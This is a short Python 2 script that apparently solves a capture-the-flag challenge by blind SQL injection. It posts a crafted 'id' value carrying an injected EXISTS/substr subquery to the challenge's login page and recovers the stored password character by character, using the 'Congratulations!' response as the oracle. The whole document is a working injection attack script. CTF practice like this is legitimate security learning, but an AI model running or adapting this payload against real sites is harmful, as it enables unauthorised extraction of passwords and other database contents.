#!/usr/bin/env python

import requests
import sys
from lxml.html import fromstring

dic = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
       'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
       'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
       'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
       'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
       '_', '-', '!', '#', '$', '%', '{', '}']

ans = ["F", "L", "A", "G"]
url = "http://ctfq.sweetduet.info:10080/~q6/index.php"


def main():
    count = 5
    for i in range(30):
        for i in range(len(dic)):
            print "".join(ans)+dic[i]
            # [ 1 = (SELECT EXISTS(SELECT * FROM user where substr(pass, 1, 4) = "FLAG"));-- ]
            # The statement above becomes with 1 = 1 truly. Therefore, increase letters after FLAG. You do Blind SQL Injection afterward!
            params = {"id": "' or 1 = (SELECT EXISTS(SELECT * FROM user where substr(pass, 1, "+str(count)+") = '" + "".join(ans) + dic[i] + "'));--", "pass": ""}
            r = requests.post(url, data=params)
            tree = fromstring(r.content)
            text = tree.findtext('.//p')
            # It's added to ans if an answer is found
            if text.find("Congratulations!") is 7:
                print "answer: "+dic[i]
                ans.append(dic[i])
                print ans
                count = count + 1
                break
            elif i + 1 is len(dic):
                return
            else:
                continue
            break

if __name__ == "__main__":
    main()

    print "\nFOUND!!\n"
    print "".join(ans)
